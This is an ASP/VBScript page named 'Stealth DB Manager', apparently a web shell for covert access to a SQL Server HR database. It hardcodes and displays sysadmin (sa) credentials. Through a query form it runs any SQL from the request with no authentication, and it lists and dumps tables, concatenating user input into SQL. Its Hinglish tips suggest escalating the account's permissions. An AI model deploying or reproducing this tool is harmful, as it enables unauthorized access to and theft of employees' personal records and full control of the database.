<%@ Language=VBScript %>
<%
' Stealth DB Manager - Debug Mode (Tables Issue Fix)

Dim Conn, RS, ConnStr, ErrMsg
Dim act, qry, tbl, dbn

dbn = "HRSuiteHC"
act = Request("act")
qry = Request("query")
tbl = Request("tbl")

ConnStr = "Provider=SQLNCLI11;Server=tcp:ATT-N-ACC,1433;Database=" & dbn & ";Uid=sa;Pwd=HRPass123;"

Set Conn = Server.CreateObject("ADODB.Connection")
On Error Resume Next
Conn.Open ConnStr
If Err.Number <> 0 Then
    Response.Write "<div style='color:red; background:#300; padding:15px;'>Connection Failed: " & Err.Description & "</div>"
    Response.End
End If
On Error Goto 0
%>

<html>
<head><title>Stealth DB Manager - Debug</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; padding:20px;">

<h2>Connected to HRSuiteHC (sa / HRPass123)</h2>

<!-- Custom Query (sabse pehle yeh test kar) -->
<h3>Custom Query (Tables test karne ke liye)</h3>
<form method="get">
    Query: <input name="query" size="90" value="SELECT name FROM sys.tables"><br><br>
    <input type="submit" value="Run Query">
</form>

<% If qry <> "" Then %>
    <h4>Query Result:</h4>
    <%
    On Error Resume Next
    Set RS = Conn.Execute(qry)
    If Err.Number <> 0 Then
        Response.Write "<div style='color:red; background:#300; padding:10px;'>Query Failed: " & Err.Description & " (Code: " & Err.Number & ")</div>"
    ElseIf Not RS.EOF Then
        Response.Write "<table border='1' style='border-color:#0f0;'>"
        Response.Write "<tr>"
        For Each fld In RS.Fields
            Response.Write "<th>" & fld.Name & "</th>"
        Next
        Response.Write "</tr>"
        Do While Not RS.EOF
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
            Next
            Response.Write "</tr>"
            RS.MoveNext
        Loop
        Response.Write "</table>"
    Else
        Response.Write "<div style='color:yellow;'>Query OK, lekin koi row nahi mila (empty result).</div>"
    End If
    RS.Close
    On Error Goto 0
    %>
<% End If %>

<!-- Tables List with Debug -->
<h3>Tables in HRSuiteHC</h3>
<%
On Error Resume Next
Set RS = Conn.Execute("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' ORDER BY TABLE_NAME")
If Err.Number <> 0 Then
    Response.Write "<div style='color:red; background:#300; padding:10px;'>INFORMATION_SCHEMA query failed: " & Err.Description & "</div>"
ElseIf RS.EOF Then
    Response.Write "<div style='color:yellow;'>No tables found in HRSuiteHC (ya permission nahi hai).</div>"
Else
    Response.Write "<p style='color:lime;'>Tables found:</p>"
    Do While Not RS.EOF
        Dim tblName : tblName = RS("TABLE_NAME")
        Response.Write "<a href='?act=browse&tbl=" & Server.URLEncode(tblName) & "' style='color:#0ff;'>" & tblName & "</a><br>"
        RS.MoveNext
    Loop
End If
RS.Close
On Error Goto 0
%>

<!-- Alternative Tables Query (sys.tables) -->
<h3>Alternative Tables (sys.tables se)</h3>
<%
On Error Resume Next
Set RS = Conn.Execute("SELECT name FROM sys.tables ORDER BY name")
If Err.Number <> 0 Then
    Response.Write "<div style='color:red;'>sys.tables query failed: " & Err.Description & "</div>"
ElseIf RS.EOF Then
    Response.Write "<div style='color:yellow;'>No tables in sys.tables (permission ya empty DB?)</div>"
Else
    Do While Not RS.EOF
        Response.Write RS("name") & "<br>"
        RS.MoveNext
    Loop
End If
RS.Close
On Error Goto 0
%>

<!-- Browse Table -->
<% If act = "browse" And tbl <> "" Then %>
    <h3>Data from <%=Server.HTMLEncode(tbl)%> (top 50 rows)</h3>
    <%
    On Error Resume Next
    Set RS = Conn.Execute("SELECT TOP 50 * FROM [" & tbl & "]")
    If Err.Number <> 0 Then
        Response.Write "<div style='color:red;'>Browse failed: " & Err.Description & "</div>"
    ElseIf Not RS.EOF Then
        Response.Write "<table border='1' style='border-color:#0f0;'>"
        Response.Write "<tr>"
        For Each fld In RS.Fields
            Response.Write "<th>" & fld.Name & "</th>"
        Next
        Response.Write "</tr>"
        Do While Not RS.EOF
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
            Next
            Response.Write "</tr>"
            RS.MoveNext
        Loop
        Response.Write "</table>"
    Else
        Response.Write "<div style='color:yellow;'>Table khali ya no select permission.</div>"
    End If
    RS.Close
    On Error Goto 0
    %>
<% End If %>

<p style="color:#888;">
Tips:<br>
1. Custom query mein yeh try kar: SELECT name FROM sys.tables<br>
2. Agar "permission denied" aaye to sa user ko db_owner role dena padega (GRANT db_owner TO sa IN HRSuiteHC).<br>
3. Ya master DB mein connect kar ke check kar: Database change kar ke master daal.<br>
4. Agar koi table dikhe to uspe click kar data dekh.
</p>

</body>
</html>

<%
If IsObject(RS) Then RS.Close
If IsObject(Conn) Then Conn.Close
%>
